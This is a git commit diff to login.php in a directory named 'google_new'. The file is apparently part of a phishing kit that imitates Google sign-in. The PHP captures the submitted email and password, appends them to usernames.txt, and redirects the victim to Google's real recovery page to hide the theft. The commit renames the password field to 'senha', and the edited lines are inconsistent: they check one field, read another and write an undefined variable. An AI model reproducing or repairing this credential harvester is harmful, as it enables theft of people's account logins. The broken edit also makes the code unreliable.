e8653bac6af7d85397918a901627be8c9b201be5
Tranecck Rev <patricksantana325@gmail.com>
2025-06-05 13:27:08 -0300

    Update login.php

--- .sites/google_new/login.php
+++ .sites/google_new/login.php
@@ -2,9 +2,9 @@
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Capture email and password from POST request
     $email = isset($_POST['email']) ? $_POST['email'] : '';
-    $password = isset($_POST['password']) ? $_POST['password'] : '';
+    $password = isset($_POST['password']) ? $_POST['senha'] : '';
     // Append to usernames.txt
-    file_put_contents("usernames.txt", "Email: " . $email . " Pass: " . $password . "\n", FILE_APPEND);
+    file_put_contents("usernames.txt", "Email: " . $email . " Pass: " . $senha . "\n", FILE_APPEND);
     // Redirect to Google sign-in page
     header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
     exit();
